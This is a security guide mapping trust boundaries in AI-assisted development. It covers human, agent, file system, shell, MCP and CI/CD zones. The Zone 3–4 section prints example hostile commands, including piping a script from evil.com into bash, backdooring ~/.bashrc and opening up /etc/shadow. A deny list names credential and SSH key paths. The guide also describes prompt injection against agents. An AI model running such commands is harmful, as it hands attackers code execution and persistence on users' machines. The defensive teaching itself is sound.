# Trust Boundaries in AI Development

> Every interaction between components in an AI-assisted development workflow crosses a trust boundary. Understanding where trust exists, where it doesn't, and where it breaks down is essential for placing security controls in the right places.

---

## What Are Trust Boundaries?

A trust boundary is the line between two components that operate at **different trust levels**. Whenever data crosses a trust boundary, it needs **validation** — because the receiving component cannot assume the data is safe, correctly formatted, or unmanipulated.

In traditional software, trust boundaries are well-understood: network perimeters, process isolation, user input validation. AI development introduces **new trust boundaries** that many teams overlook.

## Trust Zones in AI Development

```
┌─────────────────────────────────────────────────────────────────┐
│                                                                 │
│  ┌──────────────────────────────────────────────────────────┐   │
│  │  ZONE 1: HUMAN (High Trust)                              │   │
│  │  • Developer decisions and instructions                  │   │
│  │  • Manual code review judgments                          │   │
│  │  • Explicit permission grants                            │   │
│  └──────────────────────────────────────────────────────────┘   │
│                           │                                     │
│                    ═══════╪═══════  Trust Boundary A             │
│                           │        (Human → AI)                 │
│                           ▼                                     │
│  ┌──────────────────────────────────────────────────────────┐   │
│  │  ZONE 2: AI AGENT (Conditional Trust)                    │   │
│  │  • Copilot CLI, Claude Code, other agents                │   │
│  │  • Must verify all outputs                               │   │
│  │  • Influenced by everything in its context               │   │
│  └──────────────────────────────────────────────────────────┘   │
│              │              │               │                    │
│       ═══════╪══════ ═══════╪═══════ ═══════╪═══════            │
│       Boundary B     Boundary C      Boundary D                 │
│       (AI → FS)      (AI → Shell)    (AI → MCP)                │
│              │              │               │                    │
│              ▼              ▼               ▼                    │
│  ┌────────────────┐ ┌──────────────┐ ┌──────────────────────┐  │
│  │ ZONE 3: FILE   │ │ ZONE 4:      │ │ ZONE 5: MCP SERVERS  │  │
│  │ SYSTEM         │ │ SHELL/OS     │ │ (Varies by source)   │  │
│  │ (System Trust) │ │ (System)     │ │                      │  │
│  └────────────────┘ └──────────────┘ └──────────┬───────────┘  │
│                                                  │              │
│                                           ═══════╪═══════       │
│                                           Boundary E            │
│                                           (MCP → External)      │
│                                                  │              │
│                                                  ▼              │
│                                      ┌───────────────────────┐  │
│                                      │ ZONE 6: EXTERNAL      │  │
│                                      │ (Untrusted)           │  │
│                                      │ • Web content         │  │
│                                      │ • Third-party APIs    │  │
│                                      │ • User-supplied data  │  │
│                                      └───────────────────────┘  │
│                                                                 │
│  ┌──────────────────────────────────────────────────────────┐   │
│  │  ZONE 7: GENERATED CODE (Untrusted Until Verified)       │   │
│  │  • AI-generated source code                              │   │
│  │  • Must pass review, testing, and analysis               │   │
│  └──────────────────────────────────────────────────────────┘   │
│                           │                                     │
│                    ═══════╪═══════  Trust Boundary F             │
│                           │        (Code → Pipeline)            │
│                           ▼                                     │
│  ┌──────────────────────────────────────────────────────────┐   │
│  │  ZONE 8: CI/CD PIPELINE (System Trust)                   │   │
│  │  • Build, test, deploy automation                        │   │
│  │  • Should validate all inputs before execution           │   │
│  └──────────────────────────────────────────────────────────┘   │
│                                                                 │
└─────────────────────────────────────────────────────────────────┘
```

## Trust Zone Details

### Zone 1: Human (High Trust)

The human developer is the **highest trust actor** in the system. They:
- Define what the AI should do
- Grant permissions explicitly
- Make final approval decisions
- Own accountability for outcomes

```bash
# Human trust is expressed through explicit actions:
copilot-cli --allow-tool "edit_file"   # Human grants permission
git merge feature-branch                # Human approves code
```

**Risk**: Even human trust has limits. Social engineering, fatigue, and "approval fatigue" (rubber-stamping AI outputs) degrade human trust over time.

### Zone 2: AI Agent (Conditional Trust)

The AI agent operates in a **conditional trust zone** — trusted to perform tasks within its permitted scope, but its outputs must always be verified.

```
Trust Level: CONDITIONAL
─────────────────────────────────
✅ Trusted to: Follow instructions, generate plausible code
❌ NOT trusted to: Make security decisions, handle secrets safely
⚠️  Vulnerable to: Prompt injection, hallucination, context manipulation
```

Key principle: **The AI agent's behavior is influenced by everything in its context**, including potentially malicious content.

### Zone 3–4: File System and Shell (System Trust)

File system and shell operations carry **system-level trust** — they execute with the user's full permissions.

```bash
# These operations trust the AI implicitly:
echo "malicious payload" > ~/.bashrc        # Persistent compromise
curl https://evil.com/script.sh | bash      # Remote code execution
chmod 777 /etc/shadow                       # Permission manipulation
```

**This is why file system and shell access are the highest-risk trust boundary crossings.**

### Zone 5: MCP Servers (Variable Trust)

MCP servers have **heterogeneous trust levels** depending on their source:

| MCP Server Source | Trust Level | Risk |
|---|---|---|
| First-party (you built it) | High | Low — you control the code |
| Verified publisher | Medium | Medium — trust but verify |
| Community/open-source | Low | High — inspect thoroughly |
| Unknown source | None | Critical — treat as hostile |

```json
// MCP server trust assessment
{
  "server": "file-reader",
  "source": "first-party",
  "trust_level": "high",
  "capabilities": ["read files in src/"],
  "risk_assessment": "low - scoped read-only access"
}

{
  "server": "web-search-mcp",
  "source": "community",
  "trust_level": "low",
  "capabilities": ["fetch web content", "search APIs"],
  "risk_assessment": "high - returns untrusted external content"
}
```

### Zone 6: External Data (Untrusted)

Anything from outside your system is **untrusted by default**:

- Web pages fetched by AI agents
- API responses from third-party services
- Content in PRs from external contributors
- Dependency READMEs and documentation
- User-supplied input in issues

```python
# External data MUST be treated as potentially malicious

# ❌ Never trust external content directly
web_content = fetch_webpage(url)
ai_context.add(web_content)  # May contain injection!

# ✅ Sanitize before including in AI context
web_content = fetch_webpage(url)
sanitized = strip_potential_injections(web_content)
ai_context.add(sanitized)
```

### Zone 7: Generated Code (Untrusted Until Verified)

AI-generated code starts as **untrusted** and earns trust through verification:

```
Generated Code Trust Lifecycle:
─────────────────────────────────

  Untrusted ──▶ Analyzed ──▶ Reviewed ──▶ Tested ──▶ Trusted
     │              │            │           │           │
     │         Static        Human      Passes      Merged
     │         analysis      review     tests       to main
     │         passes        approves
     │
     └── AI just produced it — treat like code from
         an unknown contributor
```

## Critical Trust Boundary Crossings

Every trust boundary crossing needs a **validation checkpoint**. Here are the most important ones:

### Boundary A: Human → AI Agent

```
WHAT CROSSES: User prompts, instructions, task descriptions
RISK: Low (human is intentional), BUT instruction files may be compromised
VALIDATION NEEDED:
  - Verify instruction files haven't been tampered with
  - Review .copilot-instructions.md changes in PRs
  - Audit AGENTS.md and CLAUDE.md for injection
```

```bash
# Git hook to flag instruction file changes
#!/bin/bash
# .git/hooks/pre-commit

INSTRUCTION_FILES=(
  ".copilot-instructions.md"
  ".github/copilot-instructions.md"
  "AGENTS.md"
  "CLAUDE.md"
)

for file in "${INSTRUCTION_FILES[@]}"; do
  if git diff --cached --name-only | grep -q "$file"; then
    echo "⚠️  WARNING: AI instruction file modified: $file"
    echo "   Please review carefully for injection attempts."
    echo "   Use 'git diff --cached $file' to inspect changes."
  fi
done
```

### Boundary B: AI → File System

```
WHAT CROSSES: File reads, writes, creates, deletes
RISK: HIGH — AI may read secrets or write malicious code
VALIDATION NEEDED:
  - Restrict accessible paths
  - Block access to sensitive files (.env, keys, configs)
  - Scan written files for suspicious content
```

```yaml
# Path-based access control (conceptual)
file_access_policy:
  allow_read:
    - "src/**"
    - "tests/**"
    - "docs/**"
    - "package.json"
  deny_read:
    - ".env*"
    - "**/*.key"
    - "**/*.pem"
    - "**/credentials*"
    - "**/.ssh/**"
  allow_write:
    - "src/**"
    - "tests/**"
  deny_write:
    - ".github/workflows/**"
    - "package.json"          # Prevent dependency manipulation
    - ".copilot-instructions.md"  # Prevent self-modification
```

### Boundary C: AI → Shell

```
WHAT CROSSES: Shell commands, scripts
RISK: CRITICAL — arbitrary code execution with user privileges
VALIDATION NEEDED:
  - Human approval for each command (Copilot CLI default)
  - Command allowlisting
  - Sandbox execution environment
```

**Copilot CLI's approach**: Permission prompts at this boundary.

```
┌──────────────────────────────────────────┐
│  Copilot wants to run:                   │
│                                          │
│  $ npm install express                   │
│                                          │
│  [Allow] [Deny] [Allow for session]      │
└──────────────────────────────────────────┘
```

**Claude Code's approach**: Sandboxed by default.

```
┌──────────────────────────────────────────┐
│  Claude Code Bash tool:                  │
│  - Runs in sandboxed environment         │
│  - Network access restricted             │
│  - File access scoped to project         │
│  - Each command requires approval        │
└──────────────────────────────────────────┘
```

### Boundary D: AI → MCP Tools

```
WHAT CROSSES: Tool invocations, parameters, return values
RISK: HIGH — tool descriptions may be poisoned, tools may have side effects
VALIDATION NEEDED:
  - Verify tool descriptions haven't changed
  - Validate parameters before sending
  - Sanitize return values before processing
```

```javascript
// MCP tool validation middleware (conceptual)
function validateMCPCall(toolName, params) {
  // Check tool is in approved list
  if (!APPROVED_TOOLS.includes(toolName)) {
    throw new Error(`Tool '${toolName}' is not approved`);
  }

  // Validate parameters against schema
  const schema = TOOL_SCHEMAS[toolName];
  const validation = validateSchema(params, schema);
  if (!validation.valid) {
    throw new Error(`Invalid params: ${validation.errors}`);
  }

  // Check for suspicious parameter values
  for (const [key, value] of Object.entries(params)) {
    if (typeof value === 'string' && containsSuspiciousContent(value)) {
      throw new Error(`Suspicious content in param '${key}'`);
    }
  }

  return true;
}
```

### Boundary E: MCP → External Service

```
WHAT CROSSES: API calls, web requests, database queries
RISK: CRITICAL — data leaves your trust perimeter
VALIDATION NEEDED:
  - Allowlisted destinations only
  - No sensitive data in outbound requests
  - Response sanitization before returning to AI
```

### Boundary F: Generated Code → CI/CD

```
WHAT CROSSES: Source code, configuration, infrastructure-as-code
RISK: HIGH — malicious code could compromise build/deploy pipeline
VALIDATION NEEDED:
  - All CI/CD checks pass (lint, test, security scan)
  - Human approval required before merge
  - Separate review for CI/CD config changes
```

## Validation Checkpoint Design

Every trust boundary crossing should have a checkpoint that follows this pattern:

```
┌─────────────┐    ┌──────────────────┐    ┌─────────────┐
│   Source     │──▶ │   CHECKPOINT     │──▶ │ Destination │
│   (Zone A)  │    │                  │    │  (Zone B)   │
└─────────────┘    │ 1. Authenticate  │    └─────────────┘
                   │ 2. Validate      │
                   │ 3. Sanitize      │
                   │ 4. Log           │
                   │ 5. Allow/Deny    │
                   └──────────────────┘
```

### Checkpoint Implementation Template

```python
class TrustBoundaryCheckpoint:
    def __init__(self, source_zone, dest_zone, policy):
        self.source_zone = source_zone
        self.dest_zone = dest_zone
        self.policy = policy
        self.logger = AuditLogger()

    def validate_crossing(self, data, action):
        # Step 1: Authenticate — is the source who it claims to be?
        if not self.authenticate(data.source):
            self.logger.log_denied(data, "authentication_failed")
            raise SecurityError("Source authentication failed")

        # Step 2: Validate — does the data meet expected format?
        validation = self.validate_data(data, self.policy.schema)
        if not validation.passed:
            self.logger.log_denied(data, f"validation_failed: {validation.errors}")
            raise SecurityError(f"Validation failed: {validation.errors}")

        # Step 3: Sanitize — remove or escape dangerous content
        sanitized_data = self.sanitize(data, self.policy.sanitization_rules)

        # Step 4: Log — record the crossing for audit
        self.logger.log_crossing(
            source=self.source_zone,
            dest=self.dest_zone,
            action=action,
            data_hash=hash(sanitized_data),
            timestamp=now()
        )

        # Step 5: Allow/Deny based on policy
        if not self.policy.allows(action, sanitized_data):
            self.logger.log_denied(sanitized_data, "policy_violation")
            raise SecurityError("Action denied by policy")

        return sanitized_data
```

## Practical Application: Mapping Your Boundaries

### Step 1: Inventory All Crossings

```markdown
| # | From | To | Data | Frequency | Risk |
|---|------|-----|------|-----------|------|
| 1 | Human | AI Agent | Prompts | Every interaction | Low |
| 2 | AI Agent | File System | Read files | Very frequent | Medium |
| 3 | AI Agent | File System | Write files | Frequent | High |
| 4 | AI Agent | Shell | Commands | Moderate | Critical |
| 5 | AI Agent | MCP Server | Tool calls | Frequent | High |
| 6 | MCP Server | External API | HTTP requests | Occasional | Critical |
| 7 | External Data | AI Context | Web content | Occasional | High |
| 8 | Generated Code | CI/CD | Source code | Every PR | High |
| 9 | Repository Files | AI Context | Code, comments | Every session | Medium |
```

### Step 2: Assign Controls

```markdown
| Crossing | Control | Implementation |
|----------|---------|----------------|
| Human → AI | Instruction file auditing | Git hooks, PR reviews |
| AI → FS (read) | Path allowlisting | --allow-tool scoping |
| AI → FS (write) | Path restrictions + review | Output validation |
| AI → Shell | Permission prompts | Copilot CLI default behavior |
| AI → MCP | Tool approval + monitoring | Description auditing |
| MCP → External | Destination allowlisting | Network policy |
| External → AI | Content sanitization | Input validation layer |
| Code → CI/CD | Full test suite + review | Branch protection rules |
| Repo → AI Context | Injection scanning | Pre-context validation |
```

## Tips

✅ **Do:**
- Map all trust boundaries before deploying AI tools
- Place validation checkpoints at every boundary crossing
- Treat the AI agent as operating in its own trust zone (not human, not system)
- Log all boundary crossings for forensic capability
- Review MCP server trust levels regularly

❌ **Don't:**
- Assume data within the same zone is automatically safe
- Skip validation because "it's just a local dev tool"
- Trust MCP server outputs without sanitization
- Allow AI agents to cross boundaries without checkpoints
- Forget that AI context (the context window) mixes trusted and untrusted data
